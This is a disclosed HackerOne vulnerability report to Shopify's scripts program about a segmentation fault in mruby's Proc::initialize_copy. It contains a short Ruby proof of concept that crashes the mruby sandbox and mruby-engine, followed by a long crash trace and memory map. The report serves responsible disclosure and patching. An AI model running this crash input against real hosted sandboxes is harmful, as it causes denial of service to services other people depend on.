# Crash: calling Proc::initialize_copy with a Proc instance where initialize never ran leads to a crash

## Report Details
- **Report ID**: 184857
- **URL**: https://hackerone.com/reports/184857
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-11-24T13:56:51.618Z
- **Disclosed**: 2016-12-16T22:18:58.683Z

## Reporter
- **Username**: brakhane
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Using the same trick from #184661 with `Proc` leads to another crash, this time in `Proc` related functions.

Again, haven't looked into it besides validity testing and an initial code lookup (more detailed investigation + possible patches when there's more time on my side). Again, to give you guys the possibility to get this fixed ASAP without being limited by the time I got to spare.

# Impact
I didn't look too close but as it's accessing a 0+OFFSET this might be usable to gain code execution. Otherwise it's just a DoS, further investigation is needed.

# PoC
The PoC below crashes the `https://www.mruby.science/runs` sandbox, `mruby` master tip and `mruby-engine` reliably.

```
a = Proc.new do
end

class Proc
  def initialize
  end
end

b = Proc.new
a.initialize_copy b
```

# Traces

mruby-sandbox output:
```
$ bin/sandbox crashes/proc_crash.mrb
bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000068
ruby 2.3.3p222 (2016-11-21 revision 56859) [x86_64-linux]

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
c:0002 p:0201 s:0005 E:002398 EVAL   bin/sandbox:20 [FINISH]
c:0001 p:0000 s:0002 E:001090 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
bin/sandbox:20:in `<main>'
bin/sandbox:20:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 RIP: 0x00007fdcc38ec605 RBP: 0x00007fdcc24524e0 RSP: 0x00007fdcc2450aa8
 RAX: 0x0000000000000000 RBX: 0x00007fdcc245a520 RCX: 0x0000000000000000
 RDX: 0x0000000000000000 RDI: 0x00007fdcc245a520 RSI: 0x00007fdcc245a490
  R8: 0x00007fdcc2460560  R9: 0x0000000000000001 R10: 0x0000000000000000
 R11: 0x0000000000000000 R12: 0x00007fdcc245a520 R13: 0x000000000000004d
 R14: 0x00007fdcc24524e0 R15: 0x00007fdcc245cb60 EFL: 0x0000000000010246

-- C level backtrace information -------------------------------------------
/usr/lib/libruby.so.2.3 [0x7fdcc79aa455]
/usr/lib/libruby.so.2.3 [0x7fdcc79aa68c]
/usr/lib/libruby.so.2.3 [0x7fdcc7884e34]
/usr/lib/libruby.so.2.3 [0x7fdcc79366ce]
/usr/lib/libc.so.6 [0x7fdcc74aa0b0]
/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_proc_copy+0x25) [0x7fdcc38ec605] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/proc.c:143
/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_proc_init_copy+0x7e) [0x7fdcc38ec7be] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/proc.c:175
/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x75f) [0x7fdcc38dae4f] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165
/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7fdcc38e0697] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7fdcc38c1613] ../../../../ext/mruby_engine/eval_monitored.c:68
/usr/lib/libpthread.so.0(start_thread+0xc4) [0x7fdcc7261454]
/usr/lib/libc.so.6(clone+0x5f) [0x7fdcc755f7df]

-- Other runtime information -----------------------------------------------

* Loaded script: bin/sandbox

* Loaded features:

    0 enumerator.so
    1 thread.rb
    2 rational.so
    3 complex.so
    4 /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so
    5 /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so
    6 /usr/lib/ruby/2.3.0/unicode_normalize.rb
    7 /usr/lib/ruby/2.3.0/x86_64-linux/rbconfig.rb
    8 /usr/lib/ruby/2.3.0/rubygems/compatibility.rb
    9 /usr/lib/ruby/2.3.0/rubygems/defaults.rb
   10 /usr/lib/ruby/2.3.0/rubygems/deprecate.rb
   11 /usr/lib/ruby/2.3.0/rubygems/errors.rb
   12 /usr/lib/ruby/2.3.0/rubygems/version.rb
   13 /usr/lib/ruby/2.3.0/rubygems/requirement.rb
   14 /usr/lib/ruby/2.3.0/rubygems/platform.rb
   15 /usr/lib/ruby/2.3.0/rubygems/basic_specification.rb
   16 /usr/lib/ruby/2.3.0/rubygems/stub_specification.rb
   17 /usr/lib/ruby/2.3.0/rubygems/util/list.rb
   18 /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so
   19 /usr/lib/ruby/2.3.0/rubygems/specification.rb
   20 /usr/lib/ruby/2.3.0/rubygems/exceptions.rb
   21 /usr/lib/ruby/2.3.0/rubygems/dependency.rb
   22 /usr/lib/ruby/2.3.0/rubygems/core_ext/kernel_gem.rb
   23 /usr/lib/ruby/2.3.0/monitor.rb
   24 /usr/lib/ruby/2.3.0/rubygems/core_ext/kernel_require.rb
   25 /usr/lib/ruby/2.3.0/rubygems.rb
   26 /usr/lib/ruby/2.3.0/rubygems/path_support.rb
   27 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/version.rb
   28 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/core_ext/name_error.rb
   29 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/levenshtein.rb
   30 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/jaro_winkler.rb
   31 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkable.rb
   32 /usr/lib/ruby/2.3.0/delegate.rb
   33 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers/class_name_checker.rb
   34 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers/variable_name_checker.rb
   35 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers.rb
   36 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/method_name_checker.rb
   37 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/null_checker.rb
   38 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/formatter.rb
   39 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean.rb
   40 /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so
   41 /usr/lib/ruby/2.3.0/pathname.rb
   42 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/postit_trampoline.rb
   43 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/constants.rb
   44 /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so
   45 /usr/lib/ruby/2.3.0/rubygems/user_interaction.rb
   46 /usr/lib/ruby/2.3.0/x86_64-linux/etc.so
   47 /usr/lib/ruby/2.3.0/rubygems/config_file.rb
   48 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/rubygems_integration.rb
   49 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/current_ruby.rb
   50 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/shared_helpers.rb
   51 /usr/lib/ruby/2.3.0/fileutils.rb
   52 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/errors.rb
   53 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/environment_preserver.rb
   54 /usr/lib/ruby/2.3.0/x86_64-linux/socket.so
   55 /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so
   56 /usr/lib/ruby/2.3.0/socket.rb
   57 /usr/lib/ruby/2.3.0/timeout.rb
   58 /usr/lib/ruby/2.3.0/net/protocol.rb
   59 /usr/lib/ruby/2.3.0/uri/rfc2396_parser.rb
   60 /usr/lib/ruby/2.3.0/uri/rfc3986_parser.rb
   61 /usr/lib/ruby/2.3.0/uri/common.rb
   62 /usr/lib/ruby/2.3.0/uri/generic.rb
   63 /usr/lib/ruby/2.3.0/uri/ftp.rb
   64 /usr/lib/ruby/2.3.0/uri/http.rb
   65 /usr/lib/ruby/2.3.0/uri/https.rb
   66 /usr/lib/ruby/2.3.0/uri/ldap.rb
   67 /usr/lib/ruby/2.3.0/uri/ldaps.rb
   68 /usr/lib/ruby/2.3.0/uri/mailto.rb
   69 /usr/lib/ruby/2.3.0/uri.rb
   70 /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so
   71 /usr/lib/ruby/2.3.0/net/http/exceptions.rb
   72 /usr/lib/ruby/2.3.0/net/http/header.rb
   73 /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so
   74 /usr/lib/ruby/2.3.0/net/http/generic_request.rb
   75 /usr/lib/ruby/2.3.0/net/http/request.rb
   76 /usr/lib/ruby/2.3.0/net/http/requests.rb
   77 /usr/lib/ruby/2.3.0/net/http/response.rb
   78 /usr/lib/ruby/2.3.0/net/http/responses.rb
   79 /usr/lib/ruby/2.3.0/net/http/proxy_delta.rb
   80 /usr/lib/ruby/2.3.0/net/http/backward.rb
   81 /usr/lib/ruby/2.3.0/net/http.rb
   82 /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so
   83 /usr/lib/ruby/2.3.0/date.rb
   84 /usr/lib/ruby/2.3.0/time.rb
   85 /usr/lib/ruby/2.3.0/rubygems/request/http_pool.rb
   86 /usr/lib/ruby/2.3.0/rubygems/request/https_pool.rb
   87 /usr/lib/ruby/2.3.0/rubygems/request/connection_pools.rb
   88 /usr/lib/ruby/2.3.0/rubygems/request.rb
   89 /usr/lib/ruby/2.3.0/cgi/core.rb
   90 /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so
   91 /usr/lib/ruby/2.3.0/cgi/util.rb
   92 /usr/lib/ruby/2.3.0/cgi/cookie.rb
   93 /usr/lib/ruby/2.3.0/cgi.rb
   94 /usr/lib/ruby/2.3.0/rubygems/uri_formatter.rb
   95 /usr/lib/ruby/2.3.0/x86_64-linux/digest.so
   96 /usr/lib/ruby/2.3.0/digest.rb
   97 /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so
   98 /usr/lib/ruby/2.3.0/openssl/bn.rb
   99 /usr/lib/ruby/2.3.0/openssl/pkey.rb
  100 /usr/lib/ruby/2.3.0/openssl/cipher.rb
  101 /usr/lib/ruby/2.3.0/openssl/config.rb
  102 /usr/lib/ruby/2.3.0/openssl/digest.rb
  103 /usr/lib/ruby/2.3.0/openssl/x509.rb
  104 /usr/lib/ruby/2.3.0/openssl/buffering.rb
  105 /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so
  106 /usr/lib/ruby/2.3.0/openssl/ssl.rb
  107 /usr/lib/ruby/2.3.0/openssl.rb
  108 /usr/lib/ruby/2.3.0/securerandom.rb
  109 /usr/lib/ruby/2.3.0/resolv.rb
  110 /usr/lib/ruby/2.3.0/rubygems/remote_fetcher.rb
  111 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/gem_remote_fetcher.rb
  112 /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so
  113 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/plugin/api/source.rb
  114 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/plugin/api.rb
  115 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/plugin.rb
  116 /usr/lib/ruby/2.3.0/rubygems/util.rb
  117 /usr/lib/ruby/2.3.0/rubygems/source/git.rb
  118 /usr/lib/ruby/2.3.0/rubygems/source/installed.rb
  119 /usr/lib/ruby/2.3.0/rubygems/source/specific_file.rb
  120 /usr/lib/ruby/2.3.0/rubygems/source/local.rb
  121 /usr/lib/ruby/2.3.0/rubygems/source/lock.rb
  122 /usr/lib/ruby/2.3.0/rubygems/source/vendor.rb
  123 /usr/lib/ruby/2.3.0/rubygems/source.rb
  124 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/gem_helpers.rb
  125 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/match_platform.rb
  126 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/rubygems_ext.rb
  127 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/version.rb
  128 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler.rb
  129 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/settings.rb
  130 /usr/lib/ruby/2.3.0/rubygems/ext/build_error.rb
  131 /usr/lib/ruby/2.3.0/rubygems/ext/builder.rb
  132 /usr/lib/ruby/2.3.0/rubygems/ext/configure_builder.rb
  133 /usr/lib/ruby/2.3.0/tmpdir.rb
  134 /usr/lib/ruby/2.3.0/tempfile.rb
  135 /usr/lib/ruby/2.3.0/rubygems/ext/ext_conf_builder.rb
  136 /usr/lib/ruby/2.3.0/rubygems/ext/rake_builder.rb
  137 /usr/lib/ruby/2.3.0/optparse.rb
  138 /usr/lib/ruby/2.3.0/rubygems/command.rb
  139 /usr/lib/ruby/2.3.0/rubygems/ext/cmake_builder.rb
  140 /usr/lib/ruby/2.3.0/rubygems/ext.rb
  141 /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so
  142 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source.rb
  143 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/path.rb
  144 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/git.rb
  145 /usr/lib/ruby/2.3.0/rubygems/text.rb
  146 /usr/lib/ruby/2.3.0/rubygems/name_tuple.rb
  147 /usr/lib/ruby/2.3.0/rubygems/spec_fetcher.rb
  148 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/rubygems.rb
  149 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/lockfile_parser.rb
  150 /usr/lib/ruby/2.3.0/set.rb
  151 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/definition.rb
  152 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/dependency.rb
  153 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ruby_dsl.rb
  154 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/dsl.rb
  155 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source_list.rb
  156 /home/simon/git/shopify/mruby-engine/lib/mruby_engine/version.rb
  157 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/index.rb
  158 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/gemspec.rb
  159 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/lazy_specification.rb
  160 /usr/lib/ruby/2.3.0/tsort.rb
  161 /usr/lib/ruby/2.3.0/forwardable.rb
  162 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/spec_set.rb
  163 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/gem_version_promoter.rb
  164 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/runtime.rb
  165 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ui.rb
  166 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ui/silent.rb
  167 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ui/rg_proxy.rb
  168 /usr/lib/ruby/2.3.0/rubygems/util/licenses.rb
  169 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/remote_specification.rb
  170 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/dep_proxy.rb
  171 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/gem_metadata.rb
  172 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/errors.rb
  173 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/action.rb
  174 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/add_edge_no_circular.rb
  175 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/add_vertex.rb
  176 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/detach_vertex_named.rb
  177 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/set_payload.rb
  178 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/tag.rb
  179 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/log.rb
  180 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/vertex.rb
  181 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph.rb
  182 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/state.rb
  183 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/modules/specification_provider.rb
  184 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/delegates/resolution_state.rb
  185 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/delegates/specification_provider.rb
  186 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/resolution.rb
  187 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/resolver.rb
  188 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/modules/ui.rb
  189 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo.rb
  190 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendored_molinillo.rb
  191 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/resolver.rb
  192 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/endpoint_specification.rb
  193 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/stub_specification.rb
  194 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/setup.rb
  195 /usr/lib/ruby/2.3.0/json/version.rb
  196 /usr/lib/ruby/2.3.0/ostruct.rb
  197 /usr/lib/ruby/2.3.0/json/generic_object.rb
  198 /usr/lib/ruby/2.3.0/json/common.rb
  199 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so
  200 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so
  201 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so
  202 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so
  203 /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so
  204 /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so
  205 /usr/lib/ruby/2.3.0/json/ext.rb
  206 /usr/lib/ruby/2.3.0/json.rb
  207 /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so
  208 /home/simon/git/shopify/mruby-engine/lib/mruby_engine.rb

* Process memory map:

00400000-00401000 r-xp 00000000 08:03 948907                             /usr/bin/ruby
00600000-00601000 r--p 00000000 08:03 948907                             /usr/bin/ruby
00601000-00602000 rw-p 00001000 08:03 948907                             /usr/bin/ruby
01d8c000-02ea2000 rw-p 00000000 00:00 0                                  [heap]
7fdcbc000000-7fdcbc021000 rw-p 00000000 00:00 0 
7fdcbc021000-7fdcc0000000 ---p 00000000 00:00 0 
7fdcc11b5000-7fdcc15e1000 r--s 00000000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so
7fdcc15e1000-7fdcc17be000 r--s 00000000 08:03 934952                     /usr/lib/libc-2.24.so
7fdcc17be000-7fdcc1a3a000 r--s 00000000 08:03 936075                     /usr/lib/libruby.so.2.3.0
7fdcc1a3a000-7fdcc1a50000 r-xp 00000000 08:03 935430                     /usr/lib/libgcc_s.so.1
7fdcc1a50000-7fdcc1c4f000 ---p 00016000 08:03 935430                     /usr/lib/libgcc_s.so.1
7fdcc1c4f000-7fdcc1c50000 r--p 00015000 08:03 935430                     /usr/lib/libgcc_s.so.1
7fdcc1c50000-7fdcc1c51000 rw-p 00016000 08:03 935430                     /usr/lib/libgcc_s.so.1
7fdcc1c51000-7fdcc1c52000 ---p 00000000 00:00 0 
7fdcc1c52000-7fdcc2852000 rw-p 00000000 00:00 0 
7fdcc2852000-7fdcc2859000 r-xp 00000000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so
7fdcc2859000-7fdcc2a59000 ---p 00007000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so
7fdcc2a59000-7fdcc2a5a000 r--p 00007000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so
7fdcc2a5a000-7fdcc2a5b000 rw-p 00008000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so
7fdcc2a5b000-7fdcc2a5c000 r-xp 00000000 08:03 948492                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so
7fdcc2a5c000-7fdcc2c5b000 ---p 00001000 08:03 948492                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so
7fdcc2c5b000-7fdcc2c5c000 r--p 00000000 08:03 948492                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so
7fdcc2c5c000-7fdcc2c5d000 rw-p 00001000 08:03 948492                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so
7fdcc2c5d000-7fdcc2c5e000 r-xp 00000000 08:03 948496                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so
7fdcc2c5e000-7fdcc2e5d000 ---p 00001000 08:03 948496                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so
7fdcc2e5d000-7fdcc2e5e000 r--p 00000000 08:03 948496                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so
7fdcc2e5e000-7fdcc2e5f000 rw-p 00001000 08:03 948496                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so
7fdcc2e5f000-7fdcc2e60000 r-xp 00000000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so
7fdcc2e60000-7fdcc3060000 ---p 00001000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so
7fdcc3060000-7fdcc3061000 r--p 00001000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so
7fdcc3061000-7fdcc3062000 rw-p 00002000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so
7fdcc3062000-7fdcc3063000 r-xp 00000000 08:03 948515                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so
7fdcc3063000-7fdcc3263000 ---p 00001000 08:03 948515                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so
7fdcc3263000-7fdcc3264000 r--p 00001000 08:03 948515                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so
7fdcc3264000-7fdcc3265000 rw-p 00002000 08:03 948515                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so
7fdcc3265000-7fdcc326b000 r-xp 00000000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so
7fdcc326b000-7fdcc346a000 ---p 00006000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so
7fdcc346a000-7fdcc346b000 r--p 00005000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so
7fdcc346b000-7fdcc346c000 rw-p 00006000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so
7fdcc346c000-7fdcc3491000 r-xp 00000000 08:03 920898                     /usr/lib/liblzma.so.5.2.2
7fdcc3491000-7fdcc3690000 ---p 00025000 08:03 920898                     /usr/lib/liblzma.so.5.2.2
7fdcc3690000-7fdcc3691000 r--p 00024000 08:03 920898                     /usr/lib/liblzma.so.5.2.2
7fdcc3691000-7fdcc3692000 rw-p 00025000 08:03 920898                     /usr/lib/liblzma.so.5.2.2
7fdcc3692000-7fdcc369d000 r-xp 00000000 08:03 944077                     /usr/lib/libunwind.so.8.0.1
7fdcc369d000-7fdcc389c000 ---p 0000b000 08:03 944077                     /usr/lib/libunwind.so.8.0.1
7fdcc389c000-7fdcc389d000 r--p 0000a000 08:03 944077                     /usr/lib/libunwind.so.8.0.1
7fdcc389d000-7fdcc389e000 rw-p 0000b000 08:03 944077                     /usr/lib/libunwind.so.8.0.1
7fdcc389e000-7fdcc38ac000 rw-p 00000000 00:00 0 
7fdcc38ac000-7fdcc398a000 r-xp 00000000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so
7fdcc398a000-7fdcc3b89000 ---p 000de000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so
7fdcc3b89000-7fdcc3b8b000 r--p 000dd000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so
7fdcc3b8b000-7fdcc3b8d000 rw-p 000df000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so
7fdcc3b8d000-7fdcc3b92000 r-xp 00000000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so
7fdcc3b92000-7fdcc3d91000 ---p 00005000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so
7fdcc3d91000-7fdcc3d92000 r--p 00004000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so
7fdcc3d92000-7fdcc3d93000 rw-p 00005000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so
7fdcc3d93000-7fdcc3d94000 r-xp 00000000 08:03 948523                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so
7fdcc3d94000-7fdcc3f93000 ---p 00001000 08:03 948523                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so
7fdcc3f93000-7fdcc3f94000 r--p 00000000 08:03 948523                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so
7fdcc3f94000-7fdcc3f95000 rw-p 00001000 08:03 948523                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so
7fdcc3f95000-7fdcc3f96000 r-xp 00000000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so
7fdcc3f96000-7fdcc4196000 ---p 00001000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so
7fdcc4196000-7fdcc4197000 r--p 00001000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so
7fdcc4197000-7fdcc4198000 rw-p 00002000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so
7fdcc4198000-7fdcc419b000 r-xp 00000000 08:03 948452                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so
7fdcc419b000-7fdcc439a000 ---p 00003000 08:03 948452                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so
7fdcc439a000-7fdcc439b000 r--p 00002000 08:03 948452                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so
7fdcc439b000-7fdcc439c000 rw-p 00003000 08:03 948452                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so
7fdcc439c000-7fdcc45ea000 r-xp 00000000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0
7fdcc45ea000-7fdcc47e9000 ---p 0024e000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0
7fdcc47e9000-7fdcc4805000 r--p 0024d000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0
7fdcc4805000-7fdcc4811000 rw-p 00269000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0
